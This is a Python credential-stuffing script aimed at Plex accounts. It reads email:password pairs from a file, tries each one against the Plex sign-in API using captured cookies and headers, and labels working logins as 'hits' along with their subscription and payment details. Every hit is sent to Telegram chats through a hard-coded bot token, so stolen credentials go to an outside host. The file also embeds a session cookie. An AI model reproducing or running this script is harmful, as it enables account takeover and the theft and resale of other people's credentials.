import requests
import time
import telebot
from termcolor import colored

bot = telebot.TeleBot('6047075637:AAF26jm0REw-EdfYJ0tVODElsD_uUUZEavU')

cookies = {
    '_gcl_au': '1.1.755540513.1700853011',
    '_rdt_uuid': '1700853011401.b7192c04-678d-41a4-81d5-b2adf5e4f446',
    '_gid': 'GA1.2.1229419667.1700853012',
    '_fbp': 'fb.1.1700853012500.1589064344',
    'afUserId': '17360a7f-f378-463c-87ac-314c7bafaca7-p',
    'AF_SYNC': '1700853013216',
    'plex_tv_optin_analytics': '1',
    'plex_tv_optin_thirdparty': '1',
    'plex_tv_cookie_consent': '2',
    '_gat_UA-6111912-29': '1',
    '_ga_WVSCQW4NQZ': 'GS1.1.1700853010.1.1.1700854256.0.0.0',
    '_ga_G6FQWNSENB': 'GS1.1.1700853010.1.1.1700854256.57.0.0',
    '_ga': 'GA1.2.1994553350.1700853011',
    '_my-plex_session_32': 'NnRsMXJmcnVMem1ydHVpVlNyMWN4cjVGUGFXQjByWE9FMGxBVzBPL1RmczdkeVpLR0YzMC93VWRGdXFERExIQmlyZUd3U0VkQjRHbzNwWTBlQ01zSkE9PS0tNDUxUjQxNnZ0dVptODZ0bzRwRzYrUT09--cc0fe11d30563d5514ae42cf97e5021c047ce058',
}

headers = {
    'authority': 'clients.plex.tv',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.755540513.1700853011; _rdt_uuid=1700853011401.b7192c04-678d-41a4-81d5-b2adf5e4f446; _gid=GA1.2.1229419667.1700853012; _fbp=fb.1.1700853012500.1589064344; afUserId=17360a7f-f378-463c-87ac-314c7bafaca7-p; AF_SYNC=1700853013216; plex_tv_optin_analytics=1; plex_tv_optin_thirdparty=1; plex_tv_cookie_consent=2; _gat_UA-6111912-29=1; _ga_WVSCQW4NQZ=GS1.1.1700853010.1.1.1700854256.0.0.0; _ga_G6FQWNSENB=GS1.1.1700853010.1.1.1700854256.57.0.0; _ga=GA1.2.1994553350.1700853011; _my-plex_session_32=NnRsMXJmcnVMem1ydHVpVlNyMWN4cjVGUGFXQjByWE9FMGxBVzBPL1RmczdkeVpLR0YzMC93VWRGdXFERExIQmlyZUd3U0VkQjRHbzNwWTBlQ01zSkE9PS0tNDUxUjQxNnZ0dVptODZ0bzRwRzYrUT09--cc0fe11d30563d5514ae42cf97e5021c047ce058',
    'origin': 'https://app.plex.tv',
    'referer': 'https://app.plex.tv/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
}

params = {
    'X-Plex-Product': 'Plex SSO',
    'X-Plex-Client-Identifier': 'eccd8fa4-6c16-a077-c347-ba5fe820bd43',
}

with open('1.txt', 'r') as f:
    for line in f.readlines():
        email, password = line.strip().split(':')
        data = {
            'login': email,
            'password': password,
            'rememberMe': 'true',
        }
        response = requests.post('https://clients.plex.tv/api/v2/users/signin', params=params, cookies=cookies, headers=headers, data=data)

        try:
            response_data = response.json()
            subscription = response_data.get('subscription', {})
            plan = subscription.get('plan')
            plan = 'free' if plan == 'none' else plan

            if response_data.get('hasPassword') == True and plan != 'none':
                hit_message = f'▪︎Hit: {email}:{password}\nAccount-info:\nSubscription Active: {subscription.get("active")}\nSubscription Status: {subscription.get("status")}\nPlan: {plan}\nPayment Method: {subscription.get("paymentService")}'
                print(colored(hit_message, 'green'))
                bot.send_message(chat_id='-1001853308237', text=hit_message, parse_mode='Markdown')
            elif plan == 'none':
                hit_message = f'▪︎Hit: {email}:{password}\nPlan: {plan}'
                print(hit_message)
                bot.send_message(chat_id='-1001760151497', text=hit_message)
            else:
                print(colored(f'Dead: {email}:{password}', 'red'))

        except ValueError:
            print(colored(f'Response was not JSON, could not check: {email}:{password}', 'yellow'))

        print('-' * 50)

        time.sleep(5)